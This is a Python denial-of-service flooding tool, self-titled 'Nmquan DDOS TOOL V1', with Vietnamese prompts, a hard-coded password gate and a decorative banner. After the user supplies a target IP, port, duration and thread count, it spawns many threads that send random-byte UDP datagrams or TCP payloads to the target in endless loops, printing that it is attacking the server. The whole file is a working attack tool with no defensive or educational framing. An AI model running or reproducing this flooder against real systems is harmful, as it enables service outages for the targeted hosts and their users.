import random
import socket
import threading
import time
import os,sys
import random, socket, threading

pasw = "Yeuvanhvai"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[0] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[10] Đang xác thực tài khoản...")
        print("[20] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[30] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[40] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[50] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[60] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[70] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[80] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[90] Đang xác thực tài khoản...")
        time.sleep(1)
        print("[100] Tài khoản đúng\n")
        time.sleep(2)
        break
    else:
        time.sleep(2)
        print("[x] Sai pass rồi bạn ơi \n")
        continue
time.sleep(2)
print("\033[35m Đăng nhập thành công")
time.sleep(2)

os.system("clear")
print("""
\u001b[35m


██████╗░██████╗░░█████╗░░██████╗  ███╗░░██╗███╗░░░███╗░██████╗░██╗░░░██╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ████╗░██║████╗░████║██╔═══██╗██║░░░██║██╔══██╗████╗░██║
██║░░██║██║░░██║██║░░██║╚█████╗░  ██╔██╗██║██╔████╔██║██║██╗██║██║░░░██║███████║██╔██╗██║
██║░░██║██║░░██║██║░░██║░╚═══██╗  ██║╚████║██║╚██╔╝██║╚██████╔╝██║░░░██║██╔══██║██║╚████║
██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║░╚███║██║░╚═╝░██║░╚═██╔═╝░╚██████╔╝██║░░██║██║░╚███║
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░╚══╝╚═╝░░░░░╚═╝░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝v1

AUTHOR TOOLS : RESCRIPT BY Nmquan
Tool Version: Nmquan DDOS TOOL V1

Ron Daniel""")
print("\033[32m━━━ Nmquan yêu Vanh không? (y/n)")
choice = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[32m━━━ Thời gian")	
print("\033[32m━━━ Min thời gian 100")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 110")
threads = int(input("┗━>\033[0m:"))
def xxxx():
  data = random._urandom(998)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Đang tấn công máy chủ \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Yêu vanh rất nhìu")

def xxx():
  data = random._urandom(998)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Đang tấn công máy chủ \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Yêu vanh rất nhìu")

def xx():
  data = random._urandom(871)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Đang tấn công máy chủ \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Yêu Vanh rất nhìu")

def x():
  data = random._urandom(871)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Đang tấn công máy chủ \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Yêu vanh rất nhìu")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
  else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()